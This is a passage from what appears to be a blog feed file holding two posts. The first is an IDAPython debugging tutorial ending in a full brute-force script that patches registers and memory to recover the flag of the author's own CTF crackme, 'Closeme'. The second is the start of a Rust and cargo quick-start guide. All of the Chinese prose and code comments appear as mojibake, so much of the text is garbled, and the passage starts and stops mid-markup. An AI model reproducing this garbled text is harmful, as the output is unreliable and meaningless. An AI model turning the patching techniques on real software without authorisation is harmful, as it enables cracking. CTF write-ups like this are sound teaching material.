class="line"></span><br><span class="line"><span class="comment"># ç»Ÿè®¡ç›®æ ‡åœ°å€æ‰€åœ¨å‡½æ•°æœ‰å¤šå°‘ä¸ªåŸºæœ¬å—</span></span><br><span class="line"><span class="built_in">print</span>(FlowChart(get_func(<span class="number">0x00007FF6A1AA21B0</span>)).size)</span><br><span class="line">&gt;&gt; <span class="number">149</span></span><br></pre></td></tr></table></figure><p><strong>åŠŸèƒ½+è°ƒè¯•ç›¸å…³ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®æ–­ç‚¹</span></span><br><span class="line">add_bpt(<span class="number">0x00007FF6A1AA2577</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤æ–­ç‚¹</span></span><br><span class="line">del_bpt(<span class="number">0x00007FF6A1AA2577</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æ–­ç‚¹æ˜¯å¦å¼€å¯</span></span><br><span class="line">enable_bpt(<span class="number">0x00007FF6A1AA2577</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®idapythonä¸ºé»˜è®¤è¯­è¨€ï¼Œåœ¨è®¾ç½®æ¡ä»¶æ–­ç‚¹æ—¶ä¸è®¾ç½®ä¼šé»˜è®¤ä½¿ç”¨idc</span></span><br><span class="line">load_and_run_plugin(<span class="string">&quot;idapython&quot;</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; rip:&quot;</span>, get_reg_val(<span class="string">&quot;rip&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">add_bpt(<span class="number">0x00007FF6011D2581</span>)</span><br><span class="line"><span class="comment"># è®¾ç½®æ¡ä»¶æ–­ç‚¹ï¼Œæ¯æ¬¡è¿è¡Œåˆ°è¿™ä¸ªæ–­ç‚¹åœä¸‹ä¼šè§¦å‘condition</span></span><br><span class="line">set_bpt_cond(<span class="number">0x00007FF6011D2581</span>, <span class="string">&quot;condition()&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹äº¤å‰å¼•ç”¨ï¼Œè¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼ŒåŒ…å«idautils._xrefå¯¹è±¡</span></span><br><span class="line">a = XrefsTo(<span class="number">0x00007FF6011D2577</span>, flags=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr.frm))<span class="comment"># .frm è¿”å›äº¤å‰å¼•ç”¨åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»/å†™ 1/2/4/8å­—èŠ‚ï¼Œ wideæ˜¯å®½å­—èŠ‚</span></span><br><span class="line">get_byte(addr)</span><br><span class="line">get_word(addr)</span><br><span class="line">get_dword(addr)</span><br><span class="line">get_qword(addr)</span><br><span class="line">get_wide_byte(addr)</span><br><span class="line">get_wide_word(addr)</span><br><span class="line">get_wide_dword(addr)</span><br><span class="line">get_wide_qword(addr)</span><br><span class="line">patch_byte(addr, val)</span><br><span class="line">patch_word(addr, val)</span><br><span class="line">patch_dword(addr, val)</span><br><span class="line">patch_qword(addr, val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å¯„å­˜å™¨ripçš„å€¼</span></span><br><span class="line">get_reg_val(<span class="string">&quot;rip&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å¯„å­˜å™¨raxçš„å€¼ä¸º0x10</span></span><br><span class="line">set_reg_val(<span class="string">&quot;rax&quot;</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹è°ƒè¯•</span></span><br><span class="line">start_process()</span><br><span class="line"><span class="comment"># continue</span></span><br><span class="line">continue_process()</span><br><span class="line"><span class="comment"># è¿è¡Œåˆ°ç›®æ ‡åœ°å€</span></span><br><span class="line">run_to(addr)</span><br><span class="line"><span class="comment"># è·å–å¹¶æ¸…é™¤è°ƒè¯•å™¨äº‹ä»¶ä»£ç ï¼Œæ™®é€šä»£ç è¿”å›0x20ï¼Œæ–­ç‚¹ã€retè¿”å›0x10ï¼Œç¨‹åºç»“æŸè¿”å›è´Ÿæ•°</span></span><br><span class="line"><span class="comment"># å¿…é¡»åœ¨è¿›ç¨‹æ‰§è¡Œçš„ä»£ç åé¢è°ƒç”¨è¯¥å‡½æ•°ï¼Œä»¥ä¾¿æ£€ç´¢è°ƒè¯•å™¨çš„äº‹ä»¶ä»£ç ï¼Œå¦åˆ™å¯èƒ½ä¼šé˜»æ­¢åç»­å°è¯•</span></span><br><span class="line">wait_for_next_event(EVENT_TYPE, flags)</span><br><span class="line"><span class="comment"># å•æ­¥</span></span><br><span class="line">step_over()</span><br><span class="line">wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>) <span class="comment"># æ¯æ¬¡step_overéƒ½è¦è°ƒç”¨ä¸€æ¬¡ï¼Œcontinueè¿™äº›ä¹Ÿæ˜¯</span></span><br><span class="line"><span class="comment"># äº‹ä»¶ WFNE_SUSP å°†ç­‰å¾…å¯¼è‡´è¢«è°ƒè¯•è¿›ç¨‹æŒ‚èµ·çš„äº‹ä»¶ï¼Œæ¯”å¦‚å¼‚å¸¸æˆ–æ–­ç‚¹</span></span><br><span class="line"><span class="comment"># äº‹ä»¶ WFNE_CONT å¯ä»¥æ¢å¤è¢«æŒ‚èµ·çš„è¿›ç¨‹ï¼Œç»§ç»­æ‰§è¡Œ</span></span><br><span class="line"><span class="comment"># example:</span></span><br><span class="line">wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>)</span><br><span class="line">wait_for_next_event(WFNE_ANY | WFNE_CONT, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="å®æˆ˜ï¼šä½¿ç”¨IDApythonç¼–å†™çˆ†ç ´è„šæœ¬"><a href="#å®æˆ˜ï¼šä½¿ç”¨IDApythonç¼–å†™çˆ†ç ´è„šæœ¬" class="headerlink" title="å®æˆ˜ï¼šä½¿ç”¨IDApythonç¼–å†™çˆ†ç ´è„šæœ¬"></a>å®æˆ˜ï¼šä½¿ç”¨IDApythonç¼–å†™çˆ†ç ´è„šæœ¬</h1><p><strong>PSï¼šä½¿ç”¨æˆ‘ç»™SICTF Round3å‡ºçš„Reé¢˜Closemeä½œä¸ºä¾‹å­</strong></p><p>é™„ä»¶ï¼š <a href="../resources/re_asset/closeme_release.zip" target="_block">ç‚¹å‡»ä¸‹è½½é™„ä»¶</a></p><p>è¿™é¢˜è¯´å®è¯é¢„æœŸå°±æ˜¯çˆ†ç ´ï¼ˆx</p><p>å¤§æ¦‚å›é¡¾ä¸€ä¸‹é¢˜ç›®ï¼Œæ¯æ¬¡åˆ›å»ºå‡ ä¸ªçª—å£åéƒ½ä¼šå¼¹å‡ºä¸€ä¸ªmessageboxï¼Œç‚¹å‡»yes&#x2F;noä¼šè¢«å‚¨å­˜ä¸º1&#x2F;0ï¼Œç„¶åé•¿åº¦ä¸º16æ—¶å°±checkä¸€æ¬¡ï¼Œæ‰€ä»¥å…ˆæŠŠCreateWindowsExå’ŒMessageBoxWé‚£é‡Œçš„call xxxç»™nopæ‰ï¼ˆä½ ä¹Ÿä¸æƒ³å¼€å‡ åƒä¸Šä¸‡ä¸ªçª—å£æŠŠcpuå¹²çƒ§äº†å§xï¼‰ï¼Œç„¶åå°±éœ€è¦æ‰‹åŠ¨æ·»åŠ å„ç§å€¼äº†ã€‚</p><p>å› ä¸ºæ¯16æ¬¡å¾ªç¯æ‰èƒ½ä½¿é•¿åº¦è¾¾åˆ°16è¿›è€Œcheckï¼Œå¤ªå½±å“æ•ˆç‡äº†ï¼Œæ‰€ä»¥ç›´æ¥åœ¨åŸæ¥call messageboxé‚£é‡Œpatchæˆjmpåˆ°cmp rax, 10hè¿™é‡Œã€‚</p><p>raxæ˜¯é•¿åº¦ï¼Œç›´æ¥jmpè¿‡æ¥å°±æ²¡æœ‰è°ƒç”¨è·å–é•¿åº¦çš„å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è®¾ç½®0x10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">breakpoint_addr = <span class="number">0x00007FF6A1AA2577</span></span><br><span class="line">add_bpt(breakpoint_addr)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">rip = get_reg_val(<span class="string">&quot;RIP&quot;</span>)</span><br><span class="line"><span class="comment">#print(&quot;rip: &quot;, hex(rip))</span></span><br><span class="line"><span class="keyword">if</span> rip == breakpoint_addr:</span><br><span class="line">    set_reg_val(<span class="string">&quot;rax&quot;</span>, <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p><img src="/idapython%E5%85%A5%E9%97%A8/image-20240224010303964.png" alt="image-20240224010303964"></p><p>ä½†æ˜¯å†æ‰§è¡Œä¸¤æ­¥å°±ä¼šæŠŠä¸€ä¸ªå±€éƒ¨å˜é‡å–å‡ºæ¥è§£ä¸€å±‚å¼•ç”¨ç»™r10ï¼Œåç»­å°±æ˜¯16ä¸ªæ¯”è¾ƒï¼Œæ‰€ä»¥r10åº”è¯¥æ˜¯ä¸€ä¸ªæŒ‡å‘æˆ‘ä»¬å‚¨å­˜16ä¸ª1æˆ–0çš„åœ°å€ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬è¦ä¼ªé€ 2å±‚ï¼Œä¸€æ˜¯å…ˆæŠŠé‚£ä¸ªå±€éƒ¨å˜é‡çš„å€¼ä¿®æ”¹ä¸ºä¸€ä¸ªå¯å†™åœ°å€ï¼ˆåŒæ—¶ä¹Ÿè¦ä¿è¯è¿è¡Œæ—¶ä¸ä¼šæœ‰å…¶ä»–çš„å†™è€…ï¼‰ï¼Œç„¶åäºŒæ˜¯åœ¨è¿™ä¸ªå¯å†™åœ°å€å†™å…¥æˆ‘ä»¬çˆ†ç ´çš„æ•°æ®ã€‚</p><p>æˆ‘ç›´æ¥æ‰¾äº†.dataæ®µæœ€æœ«å°¾çš„0x10çš„ç©ºé—´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .data section</span></span><br><span class="line">buf_addr = <span class="number">0x7FF6A1ACDFF0</span></span><br><span class="line">patch_qword(get_reg_val(<span class="string">&quot;rbp&quot;</span>) + <span class="number">0x38</span>, buf_addr) <span class="comment"># å†™å…¥å±€éƒ¨å˜é‡</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†™å…¥è¦çˆ†ç ´çš„æ•°æ®éœ€è¦æ³¨æ„ç«¯åºé—®é¢˜ï¼ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">send = <span class="comment"># ä½ è¦çˆ†ç ´çš„æ•°æ®ï¼Œ æ¯”å¦‚ 0101010101010101</span></span><br><span class="line">left = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;0&#x27;</span>.join(send[:<span class="number">8</span>][::-<span class="number">1</span>])</span><br><span class="line">left = <span class="built_in">int</span>(left, <span class="number">16</span>)</span><br><span class="line">right = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;0&#x27;</span>.join(send[<span class="number">8</span>:][::-<span class="number">1</span>])</span><br><span class="line">right = <span class="built_in">int</span>(right, <span class="number">16</span>)</span><br><span class="line">patch_qword(buf_addr, left)</span><br><span class="line">patch_qword(buf_addr + <span class="number">8</span>, right)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯çˆ†ç ´2^16æ¬¡å°±è¡Œäº†ï¼</p><p><strong>å®Œæ•´çˆ†ç ´è„šæœ¬ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">this_input = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x00007FF6530D220F</span></span><br><span class="line"><span class="comment">#add_bpt(start)</span></span><br><span class="line">breakpoint_addr = <span class="number">0x00007FF6A1AA2577</span></span><br><span class="line">add_bpt(breakpoint_addr)</span><br><span class="line">win_addr = <span class="number">0x00007FF6A1AA2993</span></span><br><span class="line">add_bpt(win_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start!&quot;</span>)</span><br><span class="line">start_process()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Waiting for next event...&quot;</span>)</span><br><span class="line">wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>)</span><br><span class="line"><span class="comment"># .data section</span></span><br><span class="line">buf_addr = <span class="number">0x7FF6A1ACDFF0</span></span><br><span class="line">patch_qword(get_reg_val(<span class="string">&quot;rbp&quot;</span>) + <span class="number">0x38</span>, buf_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> this_input &gt;= <span class="number">0x10000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Burst Finished.&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    send = <span class="built_in">bin</span>(this_input)[<span class="number">2</span>:].zfill(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;send: &quot;</span>, send)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rip = get_reg_val(<span class="string">&quot;RIP&quot;</span>)</span><br><span class="line">        <span class="comment">#print(&quot;rip: &quot;, hex(rip))</span></span><br><span class="line">        <span class="keyword">if</span> rip == breakpoint_addr:</span><br><span class="line">            set_reg_val(<span class="string">&quot;rax&quot;</span>, <span class="number">0x10</span>)</span><br><span class="line">            <span class="comment">#print(&quot;set rax to 0x10&quot;)</span></span><br><span class="line"></span><br><span class="line">            left = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;0&#x27;</span>.join(send[:<span class="number">8</span>][::-<span class="number">1</span>])</span><br><span class="line">            left = <span class="built_in">int</span>(left, <span class="number">16</span>)</span><br><span class="line">            right = <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27;0&#x27;</span>.join(send[<span class="number">8</span>:][::-<span class="number">1</span>])</span><br><span class="line">            right = <span class="built_in">int</span>(right, <span class="number">16</span>)</span><br><span class="line">            patch_qword(buf_addr, left)</span><br><span class="line">            patch_qword(buf_addr + <span class="number">8</span>, right)</span><br><span class="line">        <span class="keyword">elif</span> rip == win_addr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag: SICTF&#123;&quot;</span> + <span class="built_in">bin</span>(this_input - <span class="number">1</span>)[<span class="number">2</span>:].zfill(<span class="number">16</span>) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        continue_process()</span><br><span class="line">        wait_for_next_event(WFNE_SUSP, -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;err: &quot;</span>, e)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    this_input += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;out&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDA </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust-QuickStart</title>
      <link href="/Rust-QuickStart/"/>
      <url>/Rust-QuickStart/</url>
      
        <content type="html"><![CDATA[<p><em><strong>Include:</strong></em></p><ul><li><p><em><strong>This book?</strong></em></p></li><li><p><em><strong>Before Start</strong></em></p></li><li><p><em><strong>Quick Start with a small Game</strong></em></p></li><li><p><em><strong>Improve your Rust code (TODO)</strong></em></p></li><li><p><em><strong>Others (TODO)</strong></em></p></li></ul><span id="more"></span><h1 id="This-book"><a href="#This-book" class="headerlink" title="This book?"></a>This book?</h1><p>æœ¬æ–‡æ˜¯ä¸º<strong>å·²ç»æœ‰ä¸€å®šç¼–ç¨‹åŸºç¡€</strong>ï¼ˆåƒC&#x2F;Cpp, Python, Ruby, C#ç­‰ï¼‰çš„è¯»è€…æ‰€ç¼–å†™çš„Rustå¿«é€Ÿå…¥é—¨æ•™ç¨‹ï¼Œå› æ­¤æœ¬æ–‡ä¼šå‡å®šè¯»è€…å·²ç»å¯¹é€šç”¨çš„åŸºæœ¬çš„ç¼–ç¨‹è¯­è¨€ä¸­çš„æ¦‚å¿µï¼ˆå¦‚ç±»å‹ï¼Œç»“æ„ä½“ï¼Œæµç¨‹æ§åˆ¶ç­‰ï¼‰å…·æœ‰ä¸€å®šçš„äº†è§£ã€‚å¦‚æœåœ¨æ­¤ä¹‹å‰ä½ æ²¡æœ‰å­¦ä¹ è¿‡ä»»ä½•æœ‰å…³ç¼–ç¨‹è¯­è¨€çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬å¼ºçƒˆå»ºè®®ä½ åº”è¯¥å…ˆå»å­¦ä¹ ä¸€é—¨å…¶ä»–è¯­è¨€ã€‚</p><p>å¦‚æœä½ æœ‰åŸºç¡€ä¸”å¯¹éƒ¨åˆ†è¯­è¨€æ¯”è¾ƒç†Ÿç»ƒï¼Œå¯ä»¥é€šè¿‡<strong>ã€ŠRustè¯­è¨€åœ£ç»ã€‹</strong>è¿›è¡Œæ›´åŠ ç³»ç»Ÿçš„å­¦ä¹ ã€‚è¿™æœ¬ä¹¦å¯ä»¥åœ¨Rustå®˜ç½‘æ‰¾åˆ°ï¼Œ æˆ–è€…ä½ å¯ä»¥é˜…è¯»è¿™æœ¬ä¸é”™çš„ä¸­è¯‘ç‰ˆï¼š<a href="https://course.rs/%E3%80%82">https://course.rs/ã€‚</a> å¦å¤–å¯¹äºè¿™éƒ¨åˆ†çˆ·ï¼ˆå…ˆè·ªäº† Orzï¼‰ï¼Œæ‚¨ä»¬å®Œå…¨å¯ä»¥è·³è¿‡ç¬¬ä¸€é˜¶æ®µï¼ˆBefore Start &amp;&amp; Quick Start with a small Gameï¼‰ï¼Œç›´æ¥çœ‹åé¢çš„éƒ¨åˆ†ã€‚</p><p>å¦‚æœä½ æƒ³è¦å¿«é€Ÿä¸Šæ‰‹å†™ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼Œé‚£ä¹ˆè¿™æœ¬ä¹¦å°†éå¸¸é€‚åˆä½ ï¼æœ¬ä¹¦å°†ä¼šå¸¦ä½ ä»ä¸€ä¸ªå°é¡¹ç›®ä¸­é€æ­¥å­¦ä¹ Rustï¼Œæ¯”è¾ƒå’Œå…¶ä»–è¯­è¨€çš„å¼‚åŒç‚¹ã€‚å¦å¤–å¦‚æœä½ å­¦ä¹ è¿‡ruståœ£ç»ï¼Œä½ å¯èƒ½ä¼šå‘ç°æœ¬ä¹¦çš„çŸ¥è¯†ç‚¹é¡ºåºå’Œåœ£ç»å·®åˆ«å¾ˆå¤§ï¼Œè¿™æ˜¯å› ä¸ºæœ¬ä¹¦æ˜¯ä»¥é¡¹ç›®è®²è§£ä¸ºä¼˜å…ˆçš„ï¼Œè¾…ä»¥çŸ¥è¯†ç‚¹è®²è§£ï¼Œæ¯ä¸ªçŸ¥è¯†ç‚¹æˆ‘éƒ½ä¼šå°½é‡æ”¾åœ¨ä¸€ä¸ªæ¯”è¾ƒåˆé€‚çš„ä½ç½®ã€‚</p><p>æœ€åï¼Œç¥å„ä½èƒ½ä»ä¸­æ”¶è·ä¹è¶£ï¼</p><h1 id="Before-Start"><a href="#Before-Start" class="headerlink" title="Before Start"></a>Before Start</h1><h2 id="Install-Rust"><a href="#Install-Rust" class="headerlink" title="Install Rust"></a>Install Rust</h2><p>ä½ å¯ä»¥é€šè¿‡Rustå®˜ç½‘ä¸‹è½½rustup-initï¼Œå¹¶åœ¨æœ¬æœºè¿è¡Œï¼Œæ ¹æ®æç¤ºå®‰è£…ã€‚rustupä¼šå¸®ä½ å®‰è£…å¥½å·¥å…·é“¾å’Œä¸€äº›å¸¸ç”¨å·¥å…·ï¼Œæ¯”å¦‚cargoï¼Œrustcç­‰ï¼Œå¹¶ä¸”ä¼šæ·»åŠ åˆ°PATHï¼Œæ‰€ä»¥æ— é¡»æ‰‹åŠ¨æ·»åŠ ç¯å¢ƒå˜é‡ã€‚</p><h2 id="Cargo-quick-start"><a href="#Cargo-quick-start" class="headerlink" title="Cargo quick-start"></a>Cargo quick-start</h2><p>cargoæ˜¯rustè‡ªå¸¦çš„åŒ…ç®¡ç†å™¨ï¼Œæ‹¥æœ‰éå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œå¦‚æœä½ ç†Ÿç»ƒæŒæ¡cargoçš„ä½¿ç”¨ä½ ä¼šå¾ˆå¿«çˆ±ä¸Šå®ƒ~</p><p>æœ¬éƒ¨åˆ†åªä»‹ç»ä¸€äº›æœ¬äººç»å¸¸ä½¿ç”¨åˆ°çš„å‘½ä»¤ã€‚</p><p><strong>help</strong>ï¼ˆåº”è¯¥ä¸€æ¬¾æ­£ç»çš„å·¥å…·éƒ½è¯¥æœ‰helpåŠŸèƒ½ï¼šDï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo help / cargo</span><br></pre></td></tr></table></figure><p><img src="/Rust-QuickStart/image-20231126143131252.png" alt="cargo_help"></p><blockquote><p>  å¦‚æœä½ ä½¿ç”¨çš„cargoç‰ˆæœ¬æ˜¯2023-10-18ä¹‹å‰çš„ï¼Œå¯èƒ½æ²¡æœ‰é¢œè‰²é«˜äº®</p></blockquote><p>ä½ è¿˜å¯ä»¥ç”¨helpå‘½ä»¤æ¥æŸ¥çœ‹æŸä¸ªå‘½ä»¤çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo help new</span><br></pre></td></tr></table></figure><blockquote><p>  è¿™é‡Œä¸æ”¾å›¾äº†ï¼Œå› ä¸ºå®åœ¨å¤ªé•¿äº†ï¼š(</p></blockquote><p><strong>new</strong></p><p>é€šè¿‡<code>cargo new</code>åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®æ–‡ä»¶å¤¹ï¼Œé‡Œé¢çš„ç»“æ„å¤§æ¦‚æ˜¯</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\Rust<span class="literal">-test</span>&gt; cargo new hello</span><br><span class="line">     Created binary (application) `hello` package</span><br><span class="line"><span class="built_in">PS</span> D:\Rust<span class="literal">-test</span>&gt; <span class="built_in">cd</span> hello</span><br><span class="line"><span class="built_in">PS</span> D:\Rust<span class="literal">-test</span>\hello&gt; tree</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ Cargo.toml</span><br><span class="line">â””â”€â”€ src</span><br><span class="line">    â””â”€â”€ main.rs</span><br></pre></td></tr></table></figure><p>Cargo.tomlé‡Œé¢æ˜¯ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œæ¯”å¦‚nameï¼Œversionï¼Œauthorï¼Œdependenceä¹‹ç±»çš„ã€‚srcæ–‡ä»¶å¤¹å­˜æ”¾ä½ çš„rsæºä»£ç ã€‚</p><p><strong>build</strong></p><p>ä½ å¯ä»¥é€šè¿‡buildå‘½ä»¤æ¥ç¼–è¯‘å½“å‰é¡¹ç›®ï¼Œé»˜è®¤æ˜¯debugï¼Œä½ å¯ä»¥é€šè¿‡<code>cargo build --release</code>æŒ‡å®šä¸ºreleaseï¼Œå®ƒä¼šè¿›è¡Œæ›´åŠ æ¿€è¿›çš„ä¼˜åŒ–ï¼Œå½“ç„¶ä¸ä¹‹å¯¹åº”çš„æ˜¯ç¼–è¯‘æ—¶é—´ä¹Ÿä¼šå¢åŠ ã€‚å¦‚æœä½ æƒ³è¦äº¤å‰ç¼–è¯‘åˆ°å…¶ä»–å¹³å°ï¼Œæ¯”å¦‚windowsç¼–è¯‘åˆ°linuxï¼Œä½ å¯ä»¥é€šè¿‡<code>cargo build --target x86_64-unknown-linux-musl</code>æ¥æŒ‡å®šå¹³å°ã€‚buildå‘½ä»¤ç”Ÿæˆçš„æ–‡ä»¶ä¼šæ”¾åœ¨targetæ–‡ä»¶å¤¹ä¸‹ï¼Œä¸åŒå¹³å°ï¼Œdebugï¼Œreleaseæ˜¯åˆ†å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ— é¡»æ‹…å¿ƒä¼šè¦†ç›–ã€‚</p><p><strong>run</strong></p><p><code>cargo run</code>å®é™…ä¸Šç›¸å½“äºæ‰§è¡Œäº†2ä¸ªå‘½ä»¤ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cargo build</span><br><span class="line">./target/debug/ç¼–è¯‘å¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥buildå‘½ä»¤çš„å‚æ•°åœ¨runæ˜¯å¯ä»¥ç”¨çš„ã€‚</p><p>ä½¿ç”¨newå‘½ä»¤åˆ›å»ºçš„é¡¹ç›®ä¸­main.rsé‡Œé»˜è®¤å†…å®¹æ˜¯</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿«å»runä¸€ä¸‹ä½ çš„ç¬¬ä¸€ä¸ªrustç¨‹åºå§ï¼šD</p><figure class="highlight 